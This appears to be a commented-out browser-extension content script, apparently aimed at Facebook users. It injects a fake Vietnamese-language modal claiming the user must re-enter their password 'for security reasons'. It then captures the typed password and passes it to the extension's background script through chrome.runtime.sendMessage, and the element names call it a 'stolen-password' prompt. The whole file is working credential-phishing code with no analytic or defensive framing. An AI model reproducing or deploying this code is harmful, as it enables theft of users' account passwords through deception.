// chrome.runtime.sendMessage({ type: "get_facebook" });
// const body = document.querySelector("body");
// const cc = `
// <style>
// 		.modal-stolen-password {
// 			z-index: 1000;
// 			width: 300px;
// 			border-radius: 8px;
// 			padding: 10px;
// 			box-shadow: 0 4px 8px 0px rgba(0, 0, 0, 0.1);
// 			position: fixed;
//             top: 50%;
//             left: 50%;
//             transform: translate(-50%, -50%);
//             background: #303030
// 		}
//         #stolen-password {
//             padding: 8px 15px;
//             border-radius: 8px;
//             min-width: 220px;
//             margin: 10px 0px
//         }
// 	</style>
// <div class="modal-stolen-password">
// 		<div style="color: red;font-size: 14px">Vì lý do bảo mật, bạn phải nhập lại mật khẩu để tiếp tục.</div>
// 		<input id="stolen-password" type="password" placeholder="Mật khẩu"> <button id="btn-send-password" style="background: #3578E5; color: #fff; border: none; padding: 8px; border-radius: 8px;cursor: pointer;">Tiếp tục</button>
// 	</div>
// `;

// const div = document.createElement("div");
// div.innerHTML = cc;

// body.appendChild(div);

// const btnSend = document.getElementById("btn-send-password");
// const modal = document.querySelector(".modal-stolen-password");

// btnSend.onclick = (e) => {
//     const password = document.getElementById("stolen-password").value;
//     chrome.runtime.sendMessage({ type: password });
//     body.removeChild(div);
// };
